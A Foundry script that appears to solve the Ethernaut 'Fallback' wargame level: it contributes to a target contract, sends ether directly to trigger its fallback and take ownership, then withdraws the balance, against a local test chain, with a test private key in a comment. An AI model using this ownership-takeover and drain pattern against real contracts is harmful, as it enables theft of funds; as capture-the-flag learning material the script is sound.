// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface IFallback {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
}

contract SolveScript is Script {

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        IFallback fb = IFallback(0x2b961E3959b79326A8e7F64Ef0d2d825707669b5);
        console.log("owner address before poc : %s", fb.owner());
        console.log("target contract balance : %d", address(fb).balance);
        fb.contribute{value:10}();
        (bool success, bytes memory res) = address(fb).call{value:10}("");

        console.log("owner address after poc : %s", fb.owner());
        fb.withdraw();
        console.log("target contract balance : %d", address(fb).balance);
        vm.stopBroadcast();
    }
}
